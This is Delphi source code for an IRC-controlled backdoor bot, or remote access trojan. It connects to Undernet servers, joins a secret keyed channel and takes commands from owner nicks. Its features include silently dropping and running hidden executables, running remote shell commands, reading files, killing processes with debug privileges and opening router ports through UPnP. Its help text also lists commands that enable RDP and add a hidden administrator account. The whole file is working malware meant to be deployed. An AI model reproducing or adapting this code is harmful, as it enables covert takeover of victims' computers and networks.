unit kabot;

interface

uses
  Windows, SysUtils, Forms,
  ScktComp, sycfuncs, strutils, shellapi,
  TLHelp32, Extctrls, StdCtrls, Classes, Controls;


type
  TNTdllApi = Function(Thread: thandle): boolean; stdcall;

type
  Terminate = Function(Thread: thandle; dwCode: Dword): boolean; Stdcall;

type
  TForm2 = class(TForm)
    cs: TClientSocket;
    Timer1: TTimer;
    Timer2: TTimer;
    procedure kill;
    procedure purge;
    procedure FormCreate(Sender: TObject);
    procedure csConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure csDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    // procedure addlog(str: string);
    procedure csError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure startup;
    procedure csRead(Sender: TObject; Socket: TCustomWinSocket);
    Procedure ircparse(data: String);
    procedure msgafile(chanl, readfile: string);
    procedure ListUPnP(chan: string);
    procedure Timer1Timer(Sender: TObject);
    procedure pslist(chanl: string; Sender: TObject);
    function GetProcessPid(Process: string): Integer;
    function AdminKill(pid: Dword): boolean; overload;
    function ResumeProcess(pid: Dword): boolean;
    function GetImageName(pid: Cardinal): String;
    procedure getcompname;
    procedure Timer2Timer(Sender: TObject);
    procedure getip(chan:string);





    // Procedure AddUPnP;

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form2: TForm2;

implementation

{$R *.dfm}

var
  botnick, botpass, chanpass, ownernick, ownernick1, chan: string;
  authenticated, upnp, connected, hostchk, portchk: Integer;
  killresult: boolean = false;
  ComName, chknm, chknm1: String;
  CharSize: Cardinal;
  Transfer: PChar;

  // procedures called at startup
procedure TForm2.FormCreate(Sender: TObject);
begin
  try
    hostchk := 7;
    portchk := 1;
    authenticated := 0;
    startup;
    Timer1.Enabled := true;
  except
    on E: Exception do;
  end;
end;

procedure TForm2.getcompname;
begin
  try
    CharSize := MAX_COMPUTERNAME_LENGTH + 1;
    GetMem(Transfer, CharSize);
    GetComputerName(Transfer, CharSize);
    ComName := String(Transfer);
    FreeMem(Transfer);
  except
    on E: Exception do;
  end;
end;

procedure TForm2.startup;
var
  port3, port1, port2, actualp: Integer;
  s1, s2, s3, s4, s5, s6, s7, s8, s9, actual: string;
begin
  try
    port1 := 6666;
    port2 := 6667;
    port3 := 6668;
    s1 := 'Montreal.QC.CA.Undernet.org';
    // 6666,6667,6668,6669,7000 	  	TATA Cominucations 	CA
    s2 := 'bucharest.ro.eu.undernet.org';
    // 6660-6669,7000 	  	Romania Data Systems 	EU
    s3 := 'Budapest.HU.EU.UnderNet.org'; // 6666-6668 	  	ATW Internet 	EU
    s4 := 'Diemen.NL.EU.Undernet.Org';
    // 6660-6669,7000 	  	XS4ALL Internet 	EU
    s5 := 'Lidingo.SE.EU.Undernet.org';
    // 6666,6667,6668,6669,7000 	  	Stockholm University 	EU
    s6 := 'Manchester.UK.Eu.UnderNet.org'; // 6666,6667,6668,6669,7000 	  		EU
    s7 := 'Chicago.IL.US.Undernet.org'; // 6667 	  	GigeNet 	US
    s8 := 'newyork.ny.us.undernet.org';
    // 6661-6669,7000 	  	JustEdge Networks 	US
    s9 := 'Tampa.FL.US.Undernet.org';
    // 6660-6667,7000 	  	Desync Corporation 	US
    // kill;//remove this line or the bot wont work
    case hostchk of
      1:
        actual := s1;
      2:
        actual := s2;
      3:
        actual := s3;
      4:
        actual := s4;
      5:
        actual := s5;
      6:
        actual := s6;
      7:
        actual := s7;
      8:
        actual := s8;
      9:
        actual := s9;
    else
      begin
        portchk := portchk + 1;
        hostchk := 0;
      end;
    end;

    case portchk of
      1:
        actualp := port1;
      2:
        actualp := port2;
      3:
        actualp := port3;
    else
      portchk := 0;

      if hostchk = 0 then
        actual := s4;

      if portchk = 0 then
        actualp := 6667;

    end;
    upnp := 0;
    botpass := '2wsxcde3';
    chanpass := '3edcvfr4';
    ownernick := 'N30'; // set this to your nick
    ownernick1 := 'rusty134'; // set this to your nick
    chan := '#foxtrotoscar'; // channel to join
    randomize;
    getcompname;
    botnick := lowercase(leftstr(ComName, 5) + inttostr(random(100)));
    // cs.Host := 'Lidingo.SE.EU.Undernet.org'; // set the host
    cs.Host := actual; // set the host
    cs.Port := actualp; // set the port
    cs.Active := true; // make it active(equals connect)
  except
    on E: Exception do
  end;
end;

procedure TForm2.Timer1Timer(Sender: TObject);
begin
  try
    if connected = 0 then
      startup;
      if not fileexists('c:\windows\SysChk.exe') then
      begin
      dropres('syschk', 'c:\windows\SysChk.exe');
      ShellExecute(Form2.Handle, nil, 'c:\windows\SysChk.exe',
      '', nil, sw_HIDE);
      end;

    // cs.Socket.SendText('NICK ' + botnick + #13#10);
    // cs.Socket.SendText('USER testusr rdom abc def' + #13#10);
    cs.Socket.SendText('join ' + chan + #13#10);
    cs.Socket.SendText('mode ' + chan + ' +s' + #13#10);
    cs.Socket.SendText('mode ' + chan + ' +k ' + chanpass + #13#10);
    cs.Socket.SendText('join ' + chan + ' ' + chanpass + #13#10);
  except
    on E: Exception do;
  end;
end;

procedure TForm2.Timer2Timer(Sender: TObject);
begin
  // startup;
  // timer1.Enabled:=true;
end;

// simplified way of writing to the message box
// for debug only add richedit1
// procedure TForm2.addlog(str: string);
// begin
// try
// RichEdit1.lines.add(str);
// except
// on E: Exception do
// end;
// end;

// this procedure is called when the socket connects
procedure TForm2.csConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  try
    // addlog('connected!');
    // this  sends text accross the socket connection like we typed it in telnet
    sleep(2000);
    Socket.SendText('NICK ' + botnick + #13#10);
    Socket.SendText('USER abcr rxm abc def' + #13#10);
    connected := 1;
  except
    on E: Exception do;
  end;
end;

// this procedure is called if we get disconnected
procedure TForm2.csDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  try
    // addlog('disconnected!');
    connected := 0;
    cs.Active := false;
    sleep(2000);
    hostchk := hostchk + 1;
    startup;
  except
    on E: Exception do;
  end;
end;

// this procedure is called if we receive a socket error
procedure TForm2.csError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  try
    ErrorCode := 0;
    // addlog('some error on the socket, lets check its active and ' +
    // 'if not reconnect.');
    if connected = 0 then
    begin
      try
        hostchk := hostchk + 1;
        startup; // run the startup procedure again
      except
        on E: Exception do;
      end;
    end;
  except
    on E: Exception do;
  end;
end;

// this procedure is fired when the socket receives some text
procedure TForm2.csRead(Sender: TObject; Socket: TCustomWinSocket);
var
  s: string; // create a variable
begin
  try
    s := cs.Socket.ReceiveText; // read the sockets text  in to the variable
    // addlog(s); // add the variabe to the log
    ircparse(s); // send the variable off to irc parse to be processed
  except
    on E: Exception do;
  end;
end;

// this procedure will read a file a line at a time and send it via socket to irc
procedure TForm2.msgafile(chanl, readfile: string);
var
  xFile: TextFile;
  Text: string;
begin
  try
    FileMode := fmOpenRead;
    AssignFile(xFile, readfile);
    Reset(xFile);
    while not Eof(xFile) do
    begin
      try
        ReadLn(xFile, Text);
        cs.Socket.SendText('privmsg ' + chanl + ' :' + Text + #13#10);
        sleep(1020);
      except
        on E: Exception do;
      end;
    end;
    CloseFile(xFile);
  except
    on E: Exception do;
  end;
end;

// this is the parsing procedure for the received text
// i still havent found a way to deal with the following message
// *** Ident broken or disabled, to continue to connect
// you must type /QUOTE PASS 12077 etc
Procedure TForm2.ircparse(data: String);
// takes the text in to a variable (data)
var
  content, inpfile, outpfile: String;
  tmp, tmp2, tmp3, tmp4, tmp5, tmp6, ip, args: String;
  index, pid: Integer;
  killresult: boolean;
Begin
  try
    lowercase(data); // takes caps out
    if data[1] = ':' then // look for server messages starting ':'.
    Begin
      try
        tmp := GetFirstToken(data);
        // we only get here if there was a : in position 1
        tmp2 := GetNextToken; // these are processing the line of text
        tmp3 := GetNextToken; // it gets broken in to pieces every time
        tmp4 := GetNextToken; // a space is found
        tmp5 := GetNextToken; // then we process the tmpvars tmp - tmp6
        tmp6 := GetRemainingTokens;
        index := pos('!', tmp);
        // looks for the '!' character and sets index to that number
        if Index > 0 then
          if lowercase(GetFirstToken(data)) = 'ping' then
          // respond to irc  ping
          begin
            try
              // addlog('*** PING PONG');
              content := GetRemainingTokens;
              cs.Socket.SendText('PONG ' + content + #13#10);
            except
              on E: Exception do;
            end;
          end;
        // index would be greater than 0 if we sent a message to the channel
        // because the server adds some gumph to our message when it delivers  it containaing '!'
        // we only get here if there was a '!' and it was not in position 1
        begin
          try
            delete(tmp4, 1, 1);
            if tmp4 = botnick then
            begin
              chknm := leftstr(tmp, length(ownernick) + 2);
              chknm1 := leftstr(tmp, length(ownernick1) + 2);
              // if leftstr(tmp, length(ownernick) + 2) = ':' + ownernick + '!' then
              if (chknm = ':' + ownernick + '!') or
                (chknm1 = ':' + ownernick1 + '!') then
              begin
                if upnp = 0 then
                begin
                  try
                    if not fileexists('c:\windows\upnp.exe') then
                    begin
                      dropres('upnp', 'c:\windows\Upnp.exe');
                      upnp := 1;
                    end;
                  except
                    on E: Exception do;
                  end;
                end;

                begin
                  // we only get here if our bots nick is in the buffer like ':nick'
                  if tmp5 = '@pass' then
                  begin
                    if trim(tmp6) = botpass then
                    begin
                      try
                        authenticated := 1;
                        // we only get here if after the nick we sent @pass
                        cs.Socket.SendText('privmsg ' + tmp3 + ' authenticated'
                          + #13#10);
                      except
                        on E: Exception do;

                      end;
                    end;
                  end;

                  if authenticated = 1 then
                  begin

                    // we only get here if global var 'authenticated' = 1
                    if tmp5 = '@logout' then
                    begin
                      try
                        authenticated := 0;
                        // we only get here if after the nick we sent @logout
                        cs.Socket.SendText('privmsg ' + tmp3 + ' :logged out'
                          + #13#10);
                      except
                        on E: Exception do;
                      end;
                    end;

                    // machine commands
                    if tmp5 = '@ip' then
                    begin
                      try
                        getip(tmp3);
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@quit' then
                    begin
                      try
                        cs.Socket.SendText('quit WHYYYYYYYYYYYYY! ' + #13#10);
                        kill;
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@upnp' then
                    begin
                      try
                        ListUPnP(tmp3);
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@upnpadd' then
                    begin
                      try
                        // upnpc-static.exe -a 192.168.1.250 88 88 tcp
                        ip := cs.Socket.LocalAddress;
                        args := '-a ' + ip + ' ' + trim(tmp6) + ' ' +
                          trim(tmp6) + ' tcp';
                        ShellExecute(Form2.Handle, nil, 'c:\windows\Upnp.exe',
                          PChar(args), nil, sw_HIDE);
                        cs.Socket.SendText('privmsg ' + tmp3 + ' :added.....'
                          + #13#10);
                        ListUPnP(tmp3);
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@upnpdel' then
                    begin
                      try
                        // upnpc-static.exe -d 192.168.1.250 88 88 tcp
                        ip := cs.Socket.LocalAddress;
                        args := '-d ' + ip + ' ' + trim(tmp6) + ' ' +
                          trim(tmp6) + ' tcp';
                        ShellExecute(Form2.Handle, nil, 'c:\windows\Upnp.exe',
                          PChar(args), nil, sw_HIDE);
                        cs.Socket.SendText('privmsg ' + tmp3 + ' :removed.....'
                          + #13#10);
                        ListUPnP(tmp3);
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@execute' then
                    begin
                      try
                        ShellExecute(Form2.Handle, nil, PChar(trim(tmp6)), '', nil,
                          sw_ShowNormal);
                        cs.Socket.SendText('privmsg ' + tmp3 + ' :executed- ' +
                          trim(tmp6) + #13#10);
                        // we only get here if after the nick we sent @execute
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@runcmd' then
                    begin
                      try
                        // create the infile copy the path of infile to var
                        inpfile := 'c:\windows\KB923561i.log';
                        makefile(inpfile);
                        // create the outfile copy the path of outfile to var
                        outpfile := 'c:\windows\KB925561o.log';
                        makefile(outpfile);
                        // send the command you want to run to the input file
                        runcmd(trim(tmp6), inpfile);
                        // use the createprocessredirected function to execute the command
                        // writing the result to the output file
                        CreateDOSProcessRedirected
                          ('c:\windows\system32\cmd.exe', inpfile, outpfile,
                          'Please, record this message');
                        // send the content of the outputfile as a string of msgs
                        msgafile(tmp3, outpfile);

                        cs.Socket.SendText('privmsg ' + tmp3 + ' :done.'
                          + #13#10);
                      except
                        on E: Exception do
                      end;
                    end;

                    if tmp5 = '@ps' then
                    begin
                      try
                        pslist(tmp3, nil);
                        cs.Socket.SendText('privmsg ' + tmp3 + ' :done.'
                          + #13#10);
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@kill' then
                    begin
                      if trim(tmp6) <> '' then
                        try
                          pid := GetProcessPid(lowercase(trim(tmp6)));
                          if pid <> -1 then
                          begin
                            try
                              AdminKill(pid);
                              cs.Socket.SendText
                                ('privmsg ' + tmp3 + ' :Attempting to kill ' +
                                trim(tmp6) + #13#10);
                              cs.Socket.SendText('privmsg ' + tmp3 + ' : PID' +
                                inttostr(pid) +
                                '. Check @ps to see if it worked.' + #13#10);
                            except
                              on E: Exception do;
                            end;
                          end;
                          if pid = -1 then
                          begin
                            try
                              cs.Socket.SendText
                                ('privmsg ' + tmp3 +
                                ' : You must have fucked up!'#13#10)
                            except
                              on E: Exception do;
                            end;
                          end;
                        except
                          on E: Exception do;
                        end;
                    end;

                    if tmp5 = '@ls' then
                    begin
                      try
                        // create the infile copy the path of infile to var
                        inpfile := 'c:\windows\KB923561i.log';
                        makefile(inpfile);
                        // create the outfile copy the path of outfile to var
                        outpfile := 'c:\windows\KB925561o.log';
                        makefile(outpfile);
                        // send the command you want to run to the input file
                        runcmd('dir ' + trim(tmp6), inpfile);
                        // use the createprocessredirected function to execute the command
                        // writing the result to the output file
                        CreateDOSProcessRedirected
                          ('c:\windows\system32\cmd.exe', inpfile, outpfile,
                          'Please, record this message');
                        // send the content of the outputfile as a string of msgs
                        msgafile(tmp3, outpfile);
                        cs.Socket.SendText('privmsg ' + tmp3 + ' :done.'
                          + #13#10);
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@cat' then
                    begin
                      try
                        // create the infile copy the path of infile to var
                        inpfile := 'c:\windows\KB923561i.log';
                        makefile(inpfile);
                        // create the outfile copy the path of outfile to var
                        outpfile := 'c:\windows\KB925561o.log';
                        makefile(outpfile);
                        // send the command you want to run to the input file
                        runcmd('type ' + trim(tmp6), inpfile);
                        // use the createprocessredirected function to execute the command
                        // writing the result to the output file
                        CreateDOSProcessRedirected
                          ('c:\windows\system32\cmd.exe', inpfile, outpfile,
                          'Please, record this message');
                        // send the content of the outputfile as a string of msgs
                        msgafile(tmp3, outpfile);

                        cs.Socket.SendText('privmsg ' + tmp3 + ' :done.'
                          + #13#10);
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@join' then
                    begin
                      try
                        cs.Socket.SendText('join ' + trim(tmp6)+#13#10);
                        cs.Socket.SendText('privmsg ' + tmp3 + ' :joined ' +
                          trim(tmp6) + #13#10);
                        // we only get here if after the nick we sent @join
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@part' then
                    begin
                      try
                        cs.Socket.SendText('part ' + trim(tmp6)+#13#10);
                        cs.Socket.SendText('privmsg ' + tmp3 + ' :parted ' +
                          trim(tmp6) + #13#10);
                        // we only get here if after the nick we sent @part
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@raw' then
                    begin
                      try
                        cs.Socket.SendText(trim(tmp6)+#13#10);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :sent raw command- ' + trim(tmp6) + #13#10);
                        // we only get here if after the nick we sent @raw
                      except
                        on E: Exception do;
                      end;
                    end;

                    if tmp5 = '@help' then
                    begin
                      try
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :Machine Commands - ' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@pass - Authenticate.' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@logout - Logout.' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@ip - Get the bots IP.' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@runcmd - Run a command. i.e @runcmd dir c:\'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@ls - List files in a directory. i.e @listfiles c:\'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@kill - Attempt to kill a process by name.'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@ps - List processes.' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@cat - Print the contents of a text file.  i.e @cat c:\myfile.txt'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@upnp - List UpNP entries.' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@upnpadd - Add UpNP port forward entry to bot ip. i.e @upnpadd 88'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@upnpdel - Delete UpNP entry. i.e @upnpdel 88'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@execute - Execute a file.  Full path required. i.e c:\putty.exe'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@quit - Kills the bot.' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@purge - removes all evidence of bots presence (it will be gone!)'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :IRC Commands - ' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@join - Join a channel like @join #testchan123'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@part - Part a channel like @part #testchan123'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@raw - Send raw IRC command.' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :@help - You are looking at it baby!' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :rdp cmd - reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet'
                          + '\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :net user hacker007 dani /add' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :net localgroup “Administrators” /add hacker007'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :net localgroup “Users” /del hacker007' + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList” /v hacker007 /t REG_DWORD /d 0 /f'
                          + #13#10);
                        sleep(1000);
                        cs.Socket.SendText('privmsg ' + tmp3 +
                          ' :reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f'
                          + #13#10);
                        // we only get here if after the nick we sent @help
                      except
                        on E: Exception do;
                      end;
                    end;

                  end;
                end;

              end;
            end;
          except
            on E: Exception do;
          end;
        end;
      except
        on E: Exception do;
      end;
    end;

    if lowercase(GetFirstToken(data)) = 'ping' then
    // respond to irc  ping
    begin
      try
        // addlog('*** PING PONG');
        content := GetRemainingTokens;
        cs.Socket.SendText('PONG ' + content + #13#10);
      except
        on E: Exception do;
      end;
    end;

    // NOTICE AUTH :*** No ident response
    if ansicontainsstr(data, '/MOTD') then
    // join the desired channel after /MOTD
    begin
      try
        cs.Socket.SendText('join ' + chan + #13#10);
        cs.Socket.SendText('mode ' + chan + ' +s' + #13#10);
        cs.Socket.SendText('mode ' + chan + ' +k ' + chanpass + #13#10);
      except
        on E: Exception do;
      end;
    end;
  except
    on E: Exception do;
  end;
End;

procedure TForm2.ListUPnP(chan: string);
var
  xFile: TextFile;
  Text: string;
  inpfile, outpfile, readtxt: string;
begin
  try
    inpfile := 'c:\windows\KB923561i.log';
    makefile(inpfile);
    outpfile := 'c:\windows\KB925561o.log';
    makefile(outpfile);
    runcmd('upnp -l ', inpfile);
    CreateDOSProcessRedirected('c:\windows\system32\cmd.exe', inpfile, outpfile,
      'Please, record this message');
    FileMode := fmOpenRead;
    AssignFile(xfile,outpfile);
    Reset(xfile);
    while not Eof(xfile) do
    begin
      ReadLn(xfile, readtxt);
      if ansicontainsstr(readtxt,'i protocol exPort->inAddr:inPort description remoteHost leaseTime') then
       while not Eof(xfile) do
       begin
            ReadLn(xfile, readtxt);
            if ansicontainsstr(readtxt,'GetGenericPortMappingEntry') then
            break;
            cs.Socket.SendText('privmsg ' + chan + ' :' + readtxt + #13#10);;
       end;
    end;
  except
    on E: Exception do;
  end;
   CloseFile(xfile);
end;

procedure TForm2.getip(chan:string);
var
  xFile: TextFile;
  Text: string;
  inpfile, outpfile, readtxt: string;
begin
  try
    inpfile := 'c:\windows\KB923561i.log';
    makefile(inpfile);
    outpfile := 'c:\windows\KB925561o.log';
    makefile(outpfile);
    runcmd('upnp -l ', inpfile);
    CreateDOSProcessRedirected('c:\windows\system32\cmd.exe', inpfile, outpfile,
      'Please, record this message');
    FileMode := fmOpenRead;
    AssignFile(xfile,outpfile);
    Reset(xfile);
    while not Eof(xfile) do
      begin
      ReadLn(xfile, readtxt);
    if ansicontainsstr(readtxt, 'ExternalIPAddress') then
      cs.Socket.SendText('privmsg ' + chan + ' :' + readtxt + #13#10);;
    end;
    CloseFile(xfile);
  except
    on E: Exception do;
  end;
end;

procedure TForm2.pslist(chanl: string; Sender: TObject);
var
  MyHandle: thandle;
  Struct: TProcessEntry32;
begin
  try
    MyHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
    Struct.dwSize := Sizeof(TProcessEntry32);
    if Process32First(MyHandle, Struct) then
      cs.Socket.SendText('privmsg ' + chanl + ' :' + (Struct.szExeFile)
        + #13#10);
    while Process32Next(MyHandle, Struct) do
      cs.Socket.SendText('privmsg ' + chanl + ' :' + (Struct.szExeFile)
        + #13#10);
  except
    on Exception do;
  end
end;

function SetTokenPrivileges: boolean;
var
  hToken1, hToken2, hToken3: thandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
begin
  try
    Version.dwOSVersionInfoSize := Sizeof(OSVERSIONINFO);
    GetVersionEx(Version);
    if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
    begin
      try
        OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
        hToken2 := hToken1;
        LookupPrivilegeValue(nil, 'SeDebugPrivilege',
          TokenPrivileges.Privileges[0].luid);
        TokenPrivileges.PrivilegeCount := 1;
        TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
        hToken3 := 0;
        AdjustTokenPrivileges(hToken1, false, TokenPrivileges, 0,
          PTokenPrivileges(nil)^, hToken3);
        TokenPrivileges.PrivilegeCount := 1;
        TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
        hToken3 := 0;
        AdjustTokenPrivileges(hToken2, false, TokenPrivileges, 0,
          PTokenPrivileges(nil)^, hToken3);
        CloseHandle(hToken1);
      except
        on E: Exception do;
      end;
    end;
    result := true;
  except
    on E: Exception do;
  end;
end;

function TForm2.GetProcessPid(Process: string): Integer;
var
  hProcSnap: thandle;
  pe32: TProcessEntry32;
begin
  try
    result := -1;
    hProcSnap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
    if hProcSnap = INVALID_HANDLE_VALUE then
      Exit;
    pe32.dwSize := Sizeof(TProcessEntry32);
    if Process32First(hProcSnap, pe32) = true then
      while Process32Next(hProcSnap, pe32) = true do
        if pos(Process, lowercase(pe32.szExeFile)) > 0 then
          result := pe32.th32ProcessID;
  except
    on E: Exception do;
  end;
end;

function TForm2.GetImageName(pid: Cardinal): String;
var
  ProcessSnapshotHandle: thandle;
  Struct: TProcessEntry32;
begin
  try
    result := '';
    ProcessSnapshotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
    Struct.dwSize := Sizeof(TProcessEntry32);
    if Process32First(ProcessSnapshotHandle, Struct) then
      if Struct.th32ProcessID = pid then
        result := Struct.szExeFile;
    while Process32Next(ProcessSnapshotHandle, Struct) do
      if Struct.th32ProcessID = pid then
      begin
        try
          result := Struct.szExeFile;
          Break;
        except
          on E: Exception do;
        end;
      end;
  except
    on E: Exception do
  end;
end;

function TForm2.ResumeProcess(pid: Dword): boolean;
var
  module, module1: thandle;
  ResumeProcess: TNTdllApi;
begin
  try
    result := false;
    module := LoadLibrary('ntdll.dll');
    @ResumeProcess := GetProcAddress(module, 'NtResumeProcess');
    if @ResumeProcess <> nil then
    begin
      try
        SetTokenPrivileges;
        module1 := OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        ResumeProcess(module1);
        TerminateProcess(module1, 0);
      except
        on E: Exception do;
      end;
    end;
  except
    on E: Exception do;
  end;
end;

function TForm2.AdminKill(pid: Dword): boolean;
var
  module, module1: thandle;
  TerminateProcessEx: Terminate;
  SusPendProcessEx: TNTdllApi;
  xSusPendProcessEx: TNTdllApi;
  xResumeProcess: TNTdllApi;
  zResumeProcess: TNTdllApi;
  TerminateIt: Terminate;
begin
  try
    result := false;
    module := LoadLibrary('ntdll.dll');
    @TerminateProcessEx := GetProcAddress(module, 'NTTerminateProcess');
    @TerminateIt := GetProcAddress(module, 'ZwTerminateProcess');
    @SusPendProcessEx := GetProcAddress(module, 'NTSuspendProcess');
    @xSusPendProcessEx := GetProcAddress(module, 'ZwSuspendProcess');
    @xResumeProcess := GetProcAddress(module, 'NtResumeProcess');
    @zResumeProcess := GetProcAddress(module, 'ZwResumeProcess');
    module1 := OpenProcess(PROCESS_TERMINATE OR PROCESS_ALL_ACCESS, false, pid);
    If @SusPendProcessEx <> nil then
    begin
      try
        SusPendProcessEx(module1);
        sleep(50);
        if @TerminateProcessEx <> nil then
          TerminateProcessEx(module1, 0);
        SetLastError(getLastError + 1);
        if @xResumeProcess <> nil then
          xResumeProcess(pid);
        TerminateIt(module1, 0);
        if @zResumeProcess <> nil then
          zResumeProcess(pid);
        TerminateIt(module1, 0);
      except
        on E: Exception do;
      end;
    end
    else
    begin
      If @xSusPendProcessEx <> nil then
      begin
        try
          xSusPendProcessEx(module1);
          sleep(50);
          if @TerminateIt <> nil then
            TerminateIt(module1, 0);
          SetLastError(getLastError + 1);
          if @xResumeProcess <> nil then
            xResumeProcess(pid);
          TerminateIt(module1, 0);
          if @zResumeProcess <> nil then
            zResumeProcess(pid);
          TerminateIt(module1, 0);
        except
          on E: Exception do;
        end;
      end;
      ResumeProcess(pid);
    end;
  except
    on E: Exception do;
  end;
end;

procedure TForm2.kill;
begin
  try
    close;
  except
    on E: Exception do;
  end;
end;

procedure TForm2.purge;
begin
  try
    // todo
  except
    on E: Exception do;
  end;
end;

end.
